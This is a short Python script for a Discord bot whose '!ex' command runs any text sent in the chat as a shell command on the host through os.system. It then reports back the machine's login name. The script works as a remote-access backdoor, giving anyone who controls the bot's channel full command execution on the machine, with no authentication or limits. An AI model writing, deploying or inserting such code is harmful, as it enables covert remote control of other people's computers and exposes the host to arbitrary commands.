import os
from discord.ext import commands




# Config
Discord_Token = 'TOKEN'
bot = commands.Bot(command_prefix = '!')
get_name = os.getlogin()




@bot.command(name = 'ex')
async def Execute_command(ctx, arg):

    os.system(arg)

    await ctx.send(f'{get_name} Console\n\n{arg}')


bot.run(Discord_Token)
